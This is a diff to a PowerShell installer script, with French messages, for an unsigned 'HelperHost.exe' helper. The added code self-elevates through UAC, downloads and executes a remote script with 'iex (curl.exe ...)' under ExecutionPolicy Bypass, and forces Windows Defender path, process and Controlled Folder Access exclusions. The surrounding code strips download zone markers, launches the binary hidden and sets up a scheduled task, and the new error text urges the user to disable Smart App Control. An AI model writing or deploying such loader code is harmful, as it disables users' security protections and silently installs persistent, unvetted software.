@@ -1,9 +1,68 @@
 $ErrorActionPreference = 'Stop'
 if (-not $Enroll) { $Enroll = $env:AGENTSHE_ENROLL }
 if (-not $BotBase) { $BotBase = $env:AGENTSHE_BOT_BASE }
+if (-not $InstallUrl) { $InstallUrl = $env:AGENTSHE_INSTALL_URL }
 if (-not $Enroll) { throw 'Enroll manquant' }
 if (-not $BotBase) { throw 'BotBase manquant' }
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+function Test-IsAdmin {
+  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+  $p = New-Object Security.Principal.WindowsPrincipal($id)
+  return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+# Auto-elevate: exclusions Defender require admin
+if (-not $env:AGENTSHE_ELEVATED -and -not (Test-IsAdmin)) {
+  if (-not $InstallUrl) {
+    $InstallUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/install-win.ps1'
+  }
+  $wrap = Join-Path $env:TEMP ('HelperHost-elev-' + [guid]::NewGuid().ToString('n') + '.ps1')
+  $marker = Join-Path $env:TEMP 'HelperHost-install.ok'
+  $fail = Join-Path $env:TEMP 'HelperHost-install.err'
+  Remove-Item $marker, $fail -Force -ErrorAction SilentlyContinue
+  $en = $Enroll.Replace("'", "''")
+  $bb = $BotBase.Replace("'", "''")
+  $iu = $InstallUrl.Replace("'", "''")
+  @(
+    "`$ErrorActionPreference = 'Stop'"
+    "`$Enroll = '$en'"
+    "`$BotBase = '$bb'"
+    "`$InstallUrl = '$iu'"
+    "`$env:AGENTSHE_ENROLL = '$en'"
+    "`$env:AGENTSHE_BOT_BASE = '$bb'"
+    "`$env:AGENTSHE_INSTALL_URL = '$iu'"
+    "`$env:AGENTSHE_ELEVATED = '1'"
+    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
+    "try {"
+    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
+    "  'OK' | Set-Content -Encoding ASCII '$marker'"
+    "} catch {"
+    "  `$_ | Out-String | Set-Content -Encoding UTF8 '$fail'"
+    "  exit 1"
+    "}"
+  ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap
+  try {
+    $p = Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
+      -Verb RunAs -PassThru -Wait `
+      -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $wrap)
+  } catch {
+    throw "Elevation UAC refusee. Accepte l'invite Admin."
+  }
+  Remove-Item $wrap -Force -ErrorAction SilentlyContinue
+  if (Test-Path $marker) {
+    Remove-Item $marker -Force -ErrorAction SilentlyContinue
+    Write-Output 'OK'
+    return
+  }
+  $msg = 'install admin failed'
+  if (Test-Path $fail) {
+    $msg = (Get-Content $fail -Raw -ErrorAction SilentlyContinue)
+    Remove-Item $fail -Force -ErrorAction SilentlyContinue
+  }
+  throw $msg
+}
+
 $Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.3' }
 $BotBase = $BotBase.TrimEnd('/')
 $Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
@@ -42,22 +101,28 @@ function Unblock-Quiet([string]$Path) {
   if (Test-Path $zone) { Remove-Item $zone -Force -ErrorAction SilentlyContinue }
 }
 
-function Try-DefenderExclude([string]$Path, [string]$Exe) {
-  try {
-    $mp = Get-Command Add-MpPreference -ErrorAction SilentlyContinue
-    if (-not $mp) { return }
-    Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess (Split-Path $Exe -Leaf) -ErrorAction SilentlyContinue
-  } catch {}
+function Set-DefenderExclude([string]$Path, [string]$Exe) {
+  $name = Split-Path $Exe -Leaf
+  $edge = Join-Path $Path 'EdgeRelay.exe'
+  if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) {
+    throw 'Add-MpPreference indisponible (Windows Defender requis)'
+  }
+  Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
+  Add-MpPreference -ExclusionPath $Cache -ErrorAction SilentlyContinue
+  Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
+  Add-MpPreference -ExclusionProcess 'EdgeRelay.exe' -ErrorAction SilentlyContinue
+  Add-MpPreference -ControlledFolderAccessAllowedApplications $Exe -ErrorAction SilentlyContinue
+  if (Test-Path $edge) {
+    Add-MpPreference -ControlledFolderAccessAllowedApplications $edge -ErrorAction SilentlyContinue
+  }
 }
 
 function Start-Helper([string]$Helper, [string]$WorkDir) {
   if (-not (Test-Path $Helper)) { throw "HelperHost manquant: $Helper" }
   Unblock-Quiet $Helper
   Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')
-  Try-DefenderExclude $WorkDir $Helper
+  Set-DefenderExclude $WorkDir $Helper
 
-  # 1) ProcessStartInfo
   try {
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $Helper
@@ -69,23 +134,18 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
     if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
   } catch {}
 
-  # 2) direct call
   try {
-    Push-Location $WorkDir
     Start-Process -FilePath $Helper -WorkingDirectory $WorkDir -WindowStyle Hidden -ErrorAction SilentlyContinue
-    Pop-Location
     Start-Sleep -Milliseconds 700
     if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
-  } catch { try { Pop-Location } catch {} }
+  } catch {}
 
-  # 3) cmd start /b
   try {
     & "$env:SystemRoot\System32\cmd.exe" /c "cd /d `"$WorkDir`" && start `"`" /b `"$Helper`""
     Start-Sleep -Milliseconds 900
     if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
   } catch {}
 
-  # 4) scheduled task (heure future + WorkingDirectory)
   $tn = 'HelperHostBoot'
   try {
     Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
@@ -110,19 +170,8 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
   }
 
   throw @"
-Windows bloque HelperHost.exe (Smart App Control / controle d'application).
-Ce n'est PAS un bug du script: l'exe non signe est refuse.
-
-Fais ceci (PowerShell Admin), puis relance Connecter:
-
-  Add-MpPreference -ExclusionPath '$WorkDir'
-  Add-MpPreference -ExclusionProcess 'HelperHost.exe'
-
-Puis: Parametres Windows > Confidentialite et securite > Securite Windows
-  > Controle des applications et du navigateur > Smart App Control > Desactiver
-(souvent un redemarrage est requis)
-
-Fichier:
+Exclusion Defender ajoutee, mais Windows bloque encore HelperHost.exe
+(Smart App Control / WDAC). Desactive Smart App Control puis relance:
   $Helper
 "@
 }
